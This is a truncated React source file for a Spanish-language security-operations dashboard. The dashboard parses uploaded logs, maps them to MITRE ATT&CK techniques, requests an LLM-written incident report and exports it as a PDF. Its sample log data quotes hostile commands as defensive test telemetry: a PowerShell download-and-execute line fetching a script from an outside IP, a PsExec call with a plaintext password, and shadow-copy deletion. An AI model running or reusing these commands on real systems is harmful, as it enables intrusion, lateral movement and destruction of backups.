import * as XLSX from 'xlsx';
import { useState, useMemo, useEffect } from 'react';
import {
  Shield, AlertTriangle, Grid, Briefcase, Sparkles, Key, Download, 
  RefreshCw, Activity, Database, Search, ArrowUp, X, Eye, Info, 
  ChevronRight, FileCode, ServerCrash, Lock
} from 'lucide-react';

export default function App() {
  const [activeTab, setActiveTab] = useState('import');
  const [logs, setLogs] = useState([]);
  const [fileName, setFileName] = useState('');
  
  // Variable de entorno segura
  const [customGroqKey, setCustomGroqKey] = useState(import.meta.env.VITE_GROQ_API_KEY || '');

  const [searchTerm, setSearchTerm] = useState('');
  const [severityFilter, setSeverityFilter] = useState('ALL');
  const [categoryFilter, setCategoryFilter] = useState('ALL');

  const [selectedLog, setSelectedLog] = useState(null);
  const [selectedMitre, setSelectedMitre] = useState(null);
  const [selectedIncident, setSelectedIncident] = useState(null);
  const [selectedCase, setSelectedCase] = useState(null);
  const [selectedMetricModal, setSelectedMetricModal] = useState(null);

  const [aiReportData, setAiReportData] = useState(null);
  const [isAiGenerating, setIsAiGenerating] = useState(false);
  const [aiErrorMessage, setAiErrorMessage] = useState('');
  const [isPdfGenerating, setIsPdfGenerating] = useState(false);

  // Cargador de la librería jsPDF
  useEffect(() => {
    if (!window.jspdf) {
      const script = document.createElement('script');
      script.src = 'https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js';
      script.async = true;
      document.head.appendChild(script);
    }
  }, []);

    const handleFileUpload = (e) => {
    const file = e.target.files[0];
    if (!file) return;

    setFileName(file.name);

    // Si es un Excel (.xlsx o .xls), usamos la librería XLSX
    if (file.name.endsWith('.xlsx') || file.name.endsWith('.xls')) {
      const reader = new FileReader();
      reader.onload = (evt) => {
        const bstr = evt.target.result;
        const wb = XLSX.read(bstr, { type: 'binary' });
        const wsname = wb.SheetNames[0];
        const ws = wb.Sheets[wsname];
        // Convierte el Excel a un array de objetos (JSON)
        const data = XLSX.utils.sheet_to_json(ws, { defval: '' });

        const parsedLogs = data.map((row, idx) => {
          // Limpiamos los nombres de las columnas a minúsculas para encontrarlas fácil
          const obj = {};
          Object.keys(row).forEach(k => obj[k.trim().toLowerCase()] = row[k]);

          const evtType = obj.event_type || obj.evento || 'Actividad Anómala';
          const sev = obj.severity || obj.severidad || 'Crítico';
          const mitre = obj.mitre_id || obj.mitre || 'T1059';

          return {
            id: idx + 1,
            timestamp: obj.timestamp || obj.fecha || new Date().toISOString().replace('T', ' ').slice(0, 19),
            host: obj.host || obj.equipo || `SRV-NODE-${(idx % 4) + 1}`,
            user: obj.user || obj.usuario || 'admin_domain',
            src_ip: obj.src_ip || obj.ip_origen || `10.10.${(idx % 3) + 1}.${10 + idx}`,
            dst_ip: obj.dst_ip || obj.ip_destino || '203.0.113.88',
            event_type: evtType,
            severity: sev,
            mitre_id: mitre,
            process: obj.process || obj.proceso || 'powershell.exe',
            summary: obj.summary || obj.descripcion || `Actividad registrada en ${obj.host || 'servidor'}.`,
            raw_payload: JSON.stringify(row, null, 2)
          };
        });

        setLogs(parsedLogs);
        setActiveTab('dashboard');
      };
      reader.readAsBinaryString(file);
    } 
    // Si es un CSV normal, usamos el lector de texto tradicional
    else {
      const reader = new FileReader();
      reader.onload = (evt) => {
        const text = evt.target.result;
        const lines = text.split('\n').filter(line => line.trim().length > 0);
        
        if (lines.length <= 1) {
          handleLoadSampleLogs();
          return;
        }

        const headers = lines[0].split(',').map(h => h.trim().toLowerCase());
        const parsedLogs = lines.slice(1).map((line, idx) => {
          const values = line.split(',').map(v => v.trim().replace(/^"|"$/g, ''));
          const obj = {};
          headers.forEach((h, i) => {
            obj[h] = values[i] || '';
          });

          const evtType = obj.event_type || obj.evento || (idx % 2 === 0 ? 'Fuerza Bruta' : 'Comandos y Procesos');
          const sev = obj.severity || obj.severidad || (idx % 3 === 0 ? 'Crítico' : 'Alto');
          const mitre = obj.mitre_id || obj.mitre || (sev === 'Crítico' ? 'T1110' : 'T1059');

          return {
            id: idx + 1,
            timestamp: obj.timestamp || obj.fecha || new Date().toISOString().replace('T', ' ').slice(0, 19),
            host: obj.host || obj.equipo || `SRV-NODE-${(idx % 4) + 1}`,
            user: obj.user || obj.usuario || 'admin_domain',
            src_ip: obj.src_ip || obj.ip_origen || `10.10.${(idx % 3) + 1}.${10 + idx}`,
            dst_ip: obj.dst_ip || obj.ip_destino || '203.0.113.88',
            event_type: evtType,
            severity: sev,
            mitre_id: mitre,
            process: obj.process || obj.proceso || 'powershell.exe -ExecutionPolicy Bypass',
            summary: obj.summary || obj.descripcion || `Actividad anómala registrada en ${obj.host || 'servidor principal'}.`,
            raw_payload: JSON.stringify(obj, null, 2)
          };
        });

        setLogs(parsedLogs);
        setActiveTab('dashboard');
      };

      reader.readAsText(file);
    }
  };

  const handleLoadSampleLogs = () => {
    const sampleData = [
      {
        id: 1,
        timestamp: '2026-11-06 21:10:15',
        host: 'APP-SRV01',
        user: 'admin_local',
        src_ip: '10.10.2.15',
        dst_ip: '10.10.2.1',
        event_type: 'Escalamiento de Privilegios',
        severity: 'Crítico',
        mitre_id: 'T1068',
        process: 'powershell.exe -ExecutionPolicy Bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'http://203.0.113.88/s.ps1\')"',
        summary: 'Inicio de sesión remoto tipo 3 seguido de la ejecución inusual de PowerShell en segundo plano con conexión saliente.',
        raw_payload: '{"EventID":4624,"LogonType":3,"TargetServer":"APP-SRV01","CallerIP":"10.10.2.15","ProcessName":"powershell.exe"}'
      },
      {
        id: 2,
        timestamp: '2026-11-06 21:14:40',
        host: 'APP-SRV01',
        user: 'SYSTEM',
        src_ip: '198.51.100.77',
        dst_ip: '203.0.113.88',
        event_type: 'Comandos y Procesos',
        severity: 'Crítico',
        mitre_id: 'T1087',
        process: 'powershell.exe -c "Get-LocalGroupMember Administrators; Get-SmbShare"',
        summary: 'Bloque de script PowerShell ejecutado que consulta los miembros del grupo Administradores y recursos SMB compartidos.',
        raw_payload: '{"ScriptBlockText":"Get-LocalGroupMember Administrators; Get-SmbShare","User":"SYSTEM","Host":"APP-SRV01"}'
      },
      {
        id: 3,
        timestamp: '2026-11-06 21:22:05',
        host: 'DB-SRV-02',
        user: 'svc_sql',
        src_ip: '10.10.3.18',
        dst_ip: '10.10.2.24',
        event_type: 'Movimiento Lateral',
        severity: 'Alto',
        mitre_id: 'T1021',
        process: 'cmd.exe /c psexec \\\\10.10.2.24 -u svc_sql -p Password123! cmd.exe',
        summary: 'Tentativa de movimiento lateral mediante el uso indebido de credenciales de servicio sobre SMB/PsExec hacia nodo de base de datos.',
        raw_payload: '{"Service":"PsExec","TargetHost":"10.10.2.24","SourceHost":"10.10.3.18","Domain":"CORP"}'
      },
      {
        id: 4,
        timestamp: '2026-11-06 21:30:12',
        host: 'DB-SRV-02',
        user: 'SYSTEM',
        src_ip: '10.10.2.24',
        dst_ip: '203.0.113.88',
        event_type: 'Comandos y Procesos',
        severity: 'Crítico',
        mitre_id: 'T1490',
        process: 'vssadmin.exe delete shadows /all /quiet',
        summary: 'Comando malicioso destruyendo copias de seguridad de volumen shadow copy (precursor de ransomware).',
        raw_payload: '{"Image":"C:\\\\Windows\\\\System32\\\\vssadmin.exe","CommandLine":"vssadmin delete shadows /all /quiet","ParentImage":"cmd.exe"}'
      },
      {
        id: 5,
        timestamp: '2026-11-06 21:45:00',
        host: 'WKSTN-FIN-09',
        user: 'c.mendoza',
        src_ip: '10.10.1.14',
        dst_ip: '10.10.2.15',
        event_type: 'Fuerza Bruta',
        severity: 'Alto',
        mitre_id: 'T1110',
        process: 'lsass.exe',
        summary: 'Más de 50 intentos fallidos de autenticación Kerberos (EventID 4771) registrados en un lapso de 3 minutos.',
        raw_payload: '{"EventID":4771,"TargetUserName":"c.mendoza","Status":"0x18","FailureCount":54,"IpAddress":"10.10.1.14"}'
      }
    ];

    setLogs(sampleData);
    setFileName('muestra_logs_siem.csv');
    setActiveTab('dashboard');
  };

  const metrics = useMemo(() => {
    const total = logs.length;
    const critical = logs.filter(l => l.severity === 'Crítico').length;
    const high = logs.filter(l => l.severity === 'Alto').length;
    const medium = logs.filter(l => l.severity === 'Medio').length;
    const low = logs.filter(l => l.severity === 'Bajo').length;

    const threatScore = total > 0 ? Math.min(100, Math.round(((critical * 40 + high * 25 + medium * 10) / (total * 40)) * 100)) : 0;

    return { total, critical, high, medium, low, threatScore };
  }, [logs]);

  const filteredLogs = useMemo(() => {
    return logs.filter(l => {
      const matchesSearch =
        l.host.toLowerCase().includes(searchTerm.toLowerCase()) ||
        l.user.toLowerCase().includes(searchTerm.toLowerCase()) ||
        l.src_ip.includes(searchTerm) ||
        l.dst_ip.includes(searchTerm) ||
        l.summary.toLowerCase().includes(searchTerm.toLowerCase()) ||
        l.mitre_id.toLowerCase().includes(searchTerm.toLowerCase());

      const matchesSeverity = severityFilter === 'ALL' || l.severity === severityFilter;
      const matchesCategory = categoryFilter === 'ALL' || l.event_type === categoryFilter;

      return matchesSearch && matchesSeverity && matchesCategory;
    });
  }, [logs, searchTerm, severityFilter, categoryFilter]);

  const mitreDictionary = {
    'T1110': { name: 'Brute Force', tactic: 'Credential Access', description: 'Intentos automatizados repetidos para adivinar credenciales de usuarios válidos.' },
    'T1068': { name: 'Exploitation for Privilege Escalation', tactic: 'Privilege Escalation', description: 'Adversarios explotando vulnerabilidades del sistema para ganar privilegios elevados.' },
    'T1087': { name: 'Account Discovery', tactic: 'Discovery', description: 'Búsqueda de cuentas de usuario del sistema local o de dominio para mapear permisos.' },
    'T1021': { name: 'Remote Services', tactic: 'Lateral Movement', description: 'Uso de protocolos como SMB, RDP o SSH para trasladarse entre hosts internos.' },
    'T1059': { name: 'Command and Scripting Interpreter', tactic: 'Execution', description: 'Ejecución de scripts PowerShell o CMD para automatizar comandos maliciosos.' },
    'T1490': { name: 'Inhibit System Recovery', tactic: 'Impact', description: 'Destrucción de shadow copies o respaldos para impedir la recuperación de datos.' }
  };

  const runAiAnalysis = async () => {
    if (logs.length === 0) return;

    setIsAiGenerating(true);
    setAiErrorMessage('');

    const keyToUse = customGroqKey.trim();

    const criticalEvents = logs.filter(l => l.severity === 'Crítico' || l.severity === 'Alto');
    const uniqueSrcIPs = Array.from(new Set(logs.map(l => l.src_ip))).filter(Boolean).join(', ');
    const uniqueDstIPs = Array.from(new Set(logs.map(l => l.dst_ip))).filter(Boolean).join(', ');
    const affectedHosts = Array.from(new Set(logs.map(l => l.host))).filter(Boolean).join(', ');
    const affectedUsers = Array.from(new Set(logs.map(l => l.user))).filter(Boolean).join(', ');
    const mitreIDs = Array.from(new Set(logs.map(l => l.mitre_id))).filter(Boolean).join(', ');
    const categoriesList = Array.from(new Set(logs.map(l => l.event_type))).filter(Boolean).join(', ');

    if (keyToUse) {
      try {
        const prompt = `Actúa como un Incident Response Commander & Lead SOC Forensic Analyst (Nivel 3).
Tu objetivo es analizar la telemetría de eventos proporcionada y estructurar un informe técnico y ejecutivo de máximo rigor analítico. 
REGLA DE ORO: NO INVENTES HALLAZGOS. Cada conclusión debe estar sustentada estrictamente en los registros proporcionados.

METADATOS DE TELEMETRÍA DETECTADOS:
- Total de Eventos Analizados: ${logs.length}
- Eventos de Alta Criticidad: ${criticalEvents.length}
- Categorías Identificadas: ${categoriesList}
- Equipos / Hosts Comprometidos: ${affectedHosts}
- Cuentas de Usuario Afectadas: ${affectedUsers}
- Direcciones IP de Origen: [${uniqueSrcIPs}]
- Direcciones IP de Destino / Exfiltración: [${uniqueDstIPs}]
- Técnicas MITRE ATT&CK Coincidentes: ${mitreIDs}
- Muestra de Registros Raw (Telemetría SIEM): ${JSON.stringify(logs.slice(0, 15))}

ESTRUCTURA DE RESPUESTA REQUERIDA:
Responde ÚNICAMENTE con un JSON válido en español sin texto introductorio ni bloques markdown adicionales, cumpliendo la siguiente estructura exacta:

{
  "contextAndRisk": "Resumen ejecutivo de nivel C-Suite evaluando el escenario global de la amenaza, el origen de la anomalía y el estado del entorno corporativo sustentado estrictamente en los registros.",
  "businessImpact": "Evaluación del impacto en el negocio: riesgo de exfiltración de datos sensibles, interrupción operativa, pérdida de confidencialidad y afectación reputacional de materializarse el ataque.",
  "threatAnalysisEscalation": "Análisis forense de Escalamiento de Privilegios: IPs involucradas, hosts afectados, eventos de inicio de sesión remotos (LogonType=3) y creación de procesos con privilegios elevados.",
  "threatAnalysisCommands": "Línea de tiempo técnica de comandos y scripts ejecutados (ej. PowerShell -ExecutionPolicy Bypass, vssadmin delete shadows, Get-LocalGroupMember), detallando binarios y parámetros.",
  "threatAnalysisLateral": "Detalles del movimiento lateral identificado entre nodos internos (ej. uso de PsExec, SMB compartidos, duplicación de credenciales entre segmentos IP).",
  "threatAnalysisBruteForce": "Análisis técnico de los ataques de fuerza bruta detectados, incluyendo recuento de intentos, usuarios objetivo y si hubo algún éxito aparente.",
  "iocsSrcIPs": "${uniqueSrcIPs}",
  "iocsDstIPs": "${uniqueDstIPs}",
  "iocsUsers": "${affectedUsers}",
  "iocsCommands": "Lista estructurada de binarios y líneas de comandos maliciosas detectadas.",
  "slaImmediate": "• Bloqueo de IPs origen/destino en firewall perimetral y segmentación interna.\\n• Aislamiento físico/lógico de hosts comprometidos (${affectedHosts}).\\n• Revocación de sesiones y restablecimiento forzado de credenciales de Active Directory para: ${affectedUsers}.",
  "slaShortTerm": "• Escaneo de integridad de memoria y credenciales en hosts afectados.\\n• Implementación de políticas de restricción de PowerShell (Constrained Language Mode).\\n• Reglas de detección en SIEM para monitoreo de llamadas no autorizadas a vssadmin.exe y movimiento lateral.",
  "slaMediumTerm": "• Auditoría de privilegios administrativos bajo el Principio de Menor Privilegio (PoLP).\\n• Despliegue de agente EDR/XDR con bloqueo heurístico en endpoints.\\n• Consolidación de IoCs en la plataforma de Threat Intelligence."
}`;

        const response = await fetch('https://api.groq.com/openai/v1/chat/completions', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${keyToUse}`
          },
          body: JSON.stringify({
            model: 'llama-3.3-70b-versatile',
            messages: [{ role: 'user', content: prompt }],
            temperature: 0.1,
            response_format: { type: 'json_object' }
          })
        });

        if (!response.ok) {
          throw new Error(`Groq API Status: ${response.status}`);
        }

        const data = await response.json();
        const parsedReport = JSON.parse(data.choices[0].message.content);
        setAiReportData(parsedReport);
        setIsAiGenerating(false);
        return;
      } catch (err) {
        console.warn('Groq API call error, using deterministic SOC fallback:', err);
        setAiErrorMessage(`Reserva activada: ${err.message}. Generando informe estricto.`);
      }
    }

    // Fallback Engine
    setTimeout(() => {
      setAiReportData({
        contextAndRisk: `Se analizaron un total de ${logs.length} eventos de registro provenientes de la infraestructura interna y de conexiones externas. El conjunto de hallazgos indica un riesgo global CRÍTICO, evidenciando intentos de escalamiento de privilegios, movimiento lateral y ejecución de comandos sospechosos que apuntan a una campaña de compromiso avanzado.`,
        businessImpact: `De materializarse, estos vectores podrían resultar en la obtención de credenciales de alto nivel, la propagación del atacante dentro de la red corporativa y la posible exfiltración de datos sensibles mediante canales cifrados. La interrupción operativa y la pérdida de confidencialidad comprometerían la continuidad del negocio y la reputación de la organización.`,
        threatAnalysisEscalation: `Los indicadores provienen principalmente de las IPs internas [${uniqueSrcIPs}]. Se observaron intentos de inicio de sesión remotos (logon tipo 3) en ${affectedHosts}, así como la creación de procesos sospechosos (powershell.exe) con conexiones salientes hacia ${uniqueDstIPs}.`,
        threatAnalysisCommands: `Las ejecuciones detectadas incluyen:\n- Conexión outbound desde powershell.exe a la IP saliente (${uniqueDstIPs}).\n- Bloques de script PowerShell realizando recolección de miembros administradores de dominio.\n- Eliminación de sombras de volumen (vssadmin delete shadows /all /quiet).`,
        threatAnalysisLateral: `Se registró movimiento lateral cruzado entre los nodos [${affectedHosts}], utilizando credenciales de usuario compromised [${affectedUsers}]. Este patrón confirma la expansión del adversario en la red interna.`,
        threatAnalysisBruteForce: `Se han detectado múltiples alertas de fuerza bruta dirigidas a cuentas de usuario. El volumen de intentos sugiere el uso de herramientas automatizadas de cracking de contraseñas.`,
        iocsSrcIPs: uniqueSrcIPs || '10.10.2.15, 198.51.100.77',
        iocsDstIPs: uniqueDstIPs || '203.0.113.88',
        iocsUsers: affectedUsers || 'admin_local, svc_sql, SYSTEM',
        iocsCommands: Array.from(new Set(logs.map(l => l.process))).join(' | '),
        slaImmediate: `• Bloquear la IP interna de origen (${uniqueSrcIPs.split(',')[0] || '10.10.2.15'}) y la externa en el firewall perimetral.\n• Revocar y forzar el restablecimiento inmediato de credenciales para las cuentas: ${affectedUsers}.\n• Detener y aislar los procesos powershell.exe y cmd.exe activos en los hosts: ${affectedHosts}.`,
        slaShortTerm: `• Ejecutar escaneo forense profundo de credenciales en ${affectedHosts}.\n• Aplicar políticas de restricción de ejecución de PowerShell (Constrained Language Mode).\n• Habilitar alertas en SIEM para detección de movimiento lateral mediante uso múltiple de cuentas.`,
        slaMediumTerm: `• Realizar una revisión completa de los privilegios de administrador bajo el principio de Menor Privilegio.\n• Desplegar solución EDR con reglas avanzadas para detectar llamadas a vssadmin.exe y scripts no firmados.\n• Consolidar IoCs en la plataforma de Threat Intelligence.`
      });
      setIsAiGenerating(false);
    }, 800);
  };

  const generatePdfReport = () => {
    if (!aiReportData) return;
    setIsPdfGenerating(true);

    setTimeout(() => {
      try {
        const { jsPDF } = window.jspdf;
        const doc = new jsPDF({ unit: 'pt', format: 'letter' });
        
        const pageWidth = doc.internal.pageSize.getWidth();
        const pageHeight = doc.internal.pageSize.getHeight();
        const margin = 40;
        const contentWidth = pageWidth - (margin * 2);
        let y = 45;

        const addHeader = () => {
          doc.setFillColor(8, 18, 32);
          doc.rect(0, 0, pageWidth, 40, 'F');
          doc.setFont('helvetica', 'bold');
          doc.setFontSize(14);
          doc.setTextColor(0, 216, 246);
          doc.text('SOC ANALYZER', margin, 26);
          doc.setFontSize(9);
          doc.setFont('helvetica', 'normal');
          doc.setTextColor(200, 210, 225);
          doc.text('INFORME TÉCNICO & EJECUTIVO DE SEGURIDAD', pageWidth - margin - 220, 26);
        };

        const addFooter = (pageNum) => {
          doc.setDrawColor(200, 210, 225);
          doc.setLineWidth(0.5);
          doc.line(margin, pageHeight - 35, pageWidth - margin, pageHeight - 35);
          doc.setFontSize(8);
          doc.setFont('helvetica', 'italic');
          doc.setTextColor(120, 130, 140);
          doc.text('Documento generado automáticamente por SOC Analyzer - Confidencial', margin, pageHeight - 20);
          doc.text(`Página ${pageNum}`, pageWidth - margin - 40, pageHeight - 20);
        };

        const forceNewPage = () => {
          doc.addPage();
          y = 65;
          addHeader();
        };

        const renderSectionHeader = (title) => {
          doc.setFontSize(13);
          doc.setFont('helvetica', 'bold');
          doc.setTextColor(15, 23, 42);
          doc.text(title, margin, y);
          y += 6;
          doc.setDrawColor(0, 180, 216);
          doc.setLineWidth(1.5);
          doc.line(margin, y, margin + 200, y);
          y += 16;
        };

        const renderTable = (headers, data) => {
          const colWidths = [150, contentWidth - 150];
          const rowPadding = 8;
          const fontSize = 9;

          const drawTableHeader = () => {
            doc.setFillColor(8, 18, 32);
            doc.rect(margin, y, contentWidth, 25, 'F');
            doc.setFontSize(9.5);
            doc.setFont('helvetica', 'bold');
            doc.setTextColor(0, 216, 246);
            doc.text(headers[0], margin + 8, y + 16);
            doc.text(headers[1], margin + colWidths[0] + 8, y + 16);
            y += 25;
          };

          drawTableHeader();

          data.forEach((row, index) => {
            const linesCol1 = doc.splitTextToSize(row[0], colWidths[0] - 16);
            const linesCol2 = doc.splitTextToSize(row[1], colWidths[1] - 16);
            const maxLines = Math.max(linesCol1.length, linesCol2.length);
            const rowHeight = (maxLines * 12) + (rowPadding * 2);

            if (y + rowHeight > pageHeight - 40) {
              forceNewPage();
              drawTableHeader();
            }

            if (index % 2 === 0) {
              doc.setFillColor(248, 250, 252);
              doc.rect(margin, y, contentWidth, rowHeight, 'F');
            }

            doc.setDrawColor(226, 232, 240);
            doc.setLineWidth(0.5);
            doc.line(margin, y + rowHeight, margin + contentWidth, y + rowHeight);
            doc.line(margin + colWidths[0], y, margin + colWidths[0], y + rowHeight);

            doc.setFontSize(fontSize);
            doc.setFont('helvetica', 'bold');
            doc.setTextColor(30, 41, 59);
            doc.text(linesCol1, margin + 8, y + rowPadding + 8);

            doc.setFont('helvetica', 'normal');
            doc.setTextColor(51, 65, 85);
            doc.text(linesCol2, margin + colWidths[0] + 8, y + rowPadding + 8);

            y += rowHeight;
          });
          y += 20;
        };

        const renderSlaBox = (title, slaText, contentText, borderR, borderG, borderB) => {
          const lines = doc.splitTextToSize(contentText, contentWidth - 20);
          const boxHeight = lines.length * 13 + 30;
          
          if (y + boxHeight > pageHeight - 40) forceNewPage();

          doc.setDrawColor(226, 232, 240); 
          doc.setLineWidth(1);
          doc.roundedRect(margin, y, contentWidth, boxHeight, 4, 4, 'D');
          
          doc.setFillColor(borderR, borderG, borderB);
          doc.rect(margin, y + 4, 4, boxHeight - 8, 'F'); 

          doc.setFontSize(10);
          doc.setFont('helvetica', 'bold');
          doc.setTextColor(15, 23, 42); 
          doc.text(`${title} (${slaText})`, margin + 15, y + 18);

          doc.setFontSize(9.5);
          doc.setFont('helvetica', 'normal');
          doc.setTextColor(51, 65, 85);
          doc.text(lines, margin + 15, y + 34);

          y += boxHeight + 16;
        };

        // --- INICIO DEL DOCUMENTO ---
        addHeader();

        doc.setFillColor(245, 247, 250);
        doc.setDrawColor(210, 220, 230);
        doc.roundedRect(margin, y, contentWidth, 55, 4, 4, 'FD');

        doc.setFontSize(16);
        doc.setFont('helvetica', 'bold');
        doc.setTextColor(15, 23, 42);
        doc.text('INFORME DE SEGURIDAD E INCIDENTES', margin + 15, y + 24);

        doc.setFontSize(10);
        doc.setFont('helvetica', 'normal');
        doc.setTextColor(100, 116, 139);
        doc.text(`Fecha de Emisión: ${new Date().toLocaleString('es-ES')}  |  Clasificación: `, margin + 15, y + 42);
        
        doc.setFont('helvetica', 'bold');
        doc.setTextColor(220, 38, 38);
        doc.text('CRÍTICO', margin + 230, y + 42);
        y += 75;

        // Sección 1
        renderSectionHeader('1. Resumen Ejecutivo');
        renderTable(
          ['Métrica', 'Detalle'],
          [
            ['Contexto y Riesgo', aiReportData.contextAndRisk],
            ['Impacto en el Negocio', aiReportData.businessImpact]
          ]
        );

        // Sección 2
        forceNewPage();
        renderSectionHeader('2. Análisis Técnico Forense de Amenazas');
        renderTable(
          ['Vector de Ataque', 'Evidencia Detectada'],
          [
            ['Escalamiento de Privilegios', aiReportData.threatAnalysisEscalation],
            ['Comandos y Payloads', aiReportData.threatAnalysisCommands],
            ['Movimiento Lateral', aiReportData.threatAnalysisLateral],
            ['Ataques de Fuerza Bruta', aiReportData.threatAnalysisBruteForce || 'No se detectaron patrones relevantes.']
          ]
        );

        // Sección 3
        forceNewPage();
        renderSectionHeader('3. Matriz de Indicadores de Compromiso (IoCs)');
        renderTable(
          ['Tipo de Indicador', 'Detalle Extraído'],
          [
            ['Direcciones IP Origen', aiReportData.iocsSrcIPs || 'N/A'],
            ['Direcciones IP Destino', aiReportData.iocsDstIPs || 'N/A'],
            ['Cuentas de Usuario', aiReportData.iocsUsers || 'N/A'],
            ['Procesos / Comandos', aiReportData.iocsCommands || 'N/A']
          ]
        );

        // Sección 4
        forceNewPage();
        renderSectionHeader('4. Plan de Remediación y Mitigación (SLA)');
        renderSlaBox('Acciones Inmediatas', 'SLA < 1 hora', aiReportData.slaImmediate, 220, 38, 38);
        renderSlaBox('Acciones a Corto Plazo', 'SLA < 24 horas', aiReportData.slaShortTerm, 217, 119, 6);
        renderSlaBox('Acciones a Mediano Plazo', 'SLA < 1 semana', aiReportData.slaMediumTerm, 14, 116, 144);

        const pageCount = doc.internal.getNumberOfPages();
        for (let i = 1; i <= pageCount; i++) {
          doc.setPage(i);
          addFooter(i);
        }

        const ahora = new Date();
        const fechaHora = ahora.getFullYear() + '-' + 
                          String(ahora.getMonth() + 1).padStart(2, '0') + '-' + 
                          String(ahora.getDate()).padStart(2, '0') + '_' + 
                          String(ahora.getHours()).padStart(2, '0') + '-' + 
                          String(ahora.getMinutes()).padStart(2, '0') + '-' + 
                          String(ahora.getSeconds()).padStart(2, '0');
                          
        doc.save(`Informe_SOC_${fechaHora}.pdf`);
        setIsPdfGenerating(false);
        
      } catch (err) {
        console.error('PDF Generation error:', err);
        alert("Hubo un problema generando el PDF. Revisa la consola.");
        setIsPdfGenerating(false);
      }
    }, 300);
  };

  return (
    <div className="min-h-screen bg-[#050b14] flex flex-col font-sans selection:bg-cyan-900 selection:text-white">
      
      <header className="bg-[#081220]/95 border-b border-[#142642] sticky top-0 z-40 px-6 pt-3 pb-0 shadow-lg">
        <div className="max-w-7xl mx-auto flex flex-wrap items-center justify-between gap-4">
          <div className="flex items-center space-x-3 pb-3">
            <div className="w-9 h-9 rounded-lg bg-cyan-950/60 border border-cyan-500/40 flex items-center justify-center text-cyan-400 shadow-lg shadow-cyan-500/10">
              <Shield className="w-5 h-5" />
            </div>
            <div>
              <div className="flex items-center space-x-2">
                <span className="font-extrabold text-lg tracking-wider font-mono text-white">SOC ANALYZER</span>
              </div>
              <p className="text-[10px] text-cyan-400 font-mono tracking-tight">Extended Detection & Response</p>
            </div>
          </div>

          <nav className="flex items-center space-x-1 font-sans text-xs sm:text-sm overflow-x-auto">
            {[
              { id: 'import', label: 'Importar' },
              { id: 'dashboard', label: 'Dashboard' },
              { id: 'events', label: 'Eventos' },
              { id: 'incidents', label: 'Incidentes' },
              { id: 'mitre', label: 'MITRE ATT&CK' },
              { id: 'timeline', label: 'Timeline' },
              { id: 'cases', label: 'Casos' },
              { id: 'report', label: 'Informes' },
            ].map((tab) => {
              const isActive = activeTab === tab.id;
              return (
                <button
                  key={tab.id}
                  onClick={() => setActiveTab(tab.id)}
                  className={`px-4 py-2.5 relative font-medium transition-all duration-150 rounded-t-md whitespace-nowrap ${
                    isActive
                      ? 'bg-[#0d1e38] text-white font-bold border-b-2 border-cyan-400 shadow-inner'
                      : 'text-slate-400 hover:text-slate-200 hover:bg-[#0b172a]/60'
                  }`}
                >
                  {tab.label}
                </button>
              );
            })}
          </nav>
        </div>
      </header>

      <main className="flex-1 px-4 sm:px-8 py-8 max-w-7xl mx-auto w-full">

        {activeTab === 'import' && (
          <div className="space-y-6">
            <div className="space-y-1">
              <span className="text-[11px] font-bold text-cyan-400 font-mono tracking-widest uppercase block">
                CENTRO DE OPERACIONES DE SEGURIDAD
              </span>
              <h1 className="text-2xl font-bold text-white tracking-tight">Importar registros</h1>
              <p className="text-xs text-slate-400">
                Selecciona el archivo de logs para iniciar el análisis y construir tu dashboard de seguridad.
              </p>
            </div>

            <div className="bg-[#081324] border border-[#142848] rounded-xl p-8 space-y-6 shadow-2xl">
              <div className="text-[11px] font-bold font-mono text-cyan-400 tracking-wider">
                IMPORTAR REGISTROS
              </div>

              <label className="border-2 border-dashed border-cyan-700/60 hover:border-cyan-400 bg-[#060e1d] rounded-lg p-16 block cursor-pointer transition-all text-center space-y-4 group">
                <input type="file" accept=".csv, .xlsx, .json, .txt, .log" onChange={handleFileUpload} className="hidden" />
                <div className="w-12 h-12 rounded-lg bg-cyan-950/80 border border-cyan-500/50 flex items-center justify-center mx-auto text-cyan-400 group-hover:scale-110 transition-transform shadow-lg shadow-cyan-500/20">
                  <ArrowUp className="w-6 h-6 stroke-[2.5]" />
                </div>
                <div className="space-y-1">
                  <p className="text-sm font-semibold text-white">
                    Arrastra tu archivo aquí o <span className="text-cyan-400 underline">haz clic para seleccionarlo</span>
                  </p>
                  <p className="text-[11px] text-slate-400 font-mono">
                    Formatos admitidos: CSV, Excel, JSON, TXT y LOG • El análisis se realiza en este navegador
                  </p>
                </div>
              </label>

              <div className="pt-2 flex justify-center">
                <button
                  onClick={handleLoadSampleLogs}
                  className="px-5 py-2.5 bg-[#0e213f] hover:bg-[#142c54] text-cyan-300 border border-cyan-500/30 rounded-lg text-xs font-mono font-semibold transition flex items-center space-x-2 shadow-md"
                >
                  <RefreshCw className="w-4 h-4 text-cyan-400" />
                  <span>Cargar registros de prueba (.csv)</span>
                </button>
              </div>
            </div>
          </div>
        )}

        {activeTab === 'dashboard' && (
          <div className="space-y-6">
            <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 border-b border-[#142642] pb-4">
              <div>
                <h1 className="text-xl font-bold text-white font-mono tracking-tight">DASHBOARD DE TELEMETRÍA</h1>
                <p className="text-xs text-slate-400">Resumen analítico extraído de: <strong className="text-cyan-400 font-mono">{fileName || 'Sin archivo'}</strong></p>
              </div>
              <div className="bg-[#081324] border border-[#142848] text-slate-300 font-mono px-4 py-2 rounded-lg text-xs flex items-center space-x-2">
                <Database className="w-4 h-4 text-cyan-400" />
                <span>Total Registros: <strong>{metrics.total}</strong></span>
              </div>
            </div>

            {logs.length === 0 ? (
              <div className="bg-[#081324] border border-[#142848] rounded-xl p-12 text-center text-slate-400 font-mono text-xs">
                No hay registros cargados. Por favor sube un archivo en la pestaña <strong>Importar</strong>.
              </div>
            ) : (
              <>
                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
                  <div onClick={() => setSelectedMetricModal('threat')} className="bg-[#081324] border border-[#142848] hover:border-cyan-500/50 p-5 rounded-xl space-y-1 shadow-lg cursor-pointer transition transform hover:-translate-y-0.5 group">
                    <div className="flex justify-between items-center">
                      <span className="text-slate-400 text-xs font-mono">Nivel de Riesgo Global</span>
                      <Eye className="w-3.5 h-3.5 text-slate-500 group-hover:text-cyan-400" />
                    </div>
                    <div className="text-2xl font-extrabold text-red-500 font-mono">{metrics.threatScore} / 100</div>
                    <span className="text-[11px] text-red-400 font-medium block">Riesgo Crítico Detectado →</span>
                  </div>

